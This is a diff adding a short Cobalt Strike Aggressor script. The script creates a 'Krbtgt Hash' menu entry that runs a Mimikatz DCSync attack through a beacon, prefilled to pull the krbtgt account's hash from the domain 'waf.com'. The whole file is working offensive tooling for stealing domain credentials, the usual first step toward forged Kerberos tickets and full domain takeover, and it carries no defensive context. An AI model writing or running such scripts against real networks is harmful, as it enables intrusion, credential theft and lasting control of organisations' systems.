@@ -1,0 +1,21 @@
+    menu "Krbtgt Hash" {
+    	item "Mimikatz-bdcsync"{
+    		local('$bid');
+               foreach $bid ($1){
+                   mimikatz_bdcsync($bid);
+            }
+    	}
+
+
+sub mimikatz_bdcsync{
+	$bid = $1;	
+	$dialog = dialog("DomainInfo" , %(beacon => $1 , domain => "waf.com" , user => "krbtgt") , lambda({
+		bdcsync($3["beacon"] , $3["domain"] , $3["user"])
+	}));
+
+	drow_text($dialog, "domain", "Domain:");
+	drow_text($dialog, "user", "User:");
+	dbutton_action($dialog, "Launch");
+	dialog_show($dialog);
+	}
+}
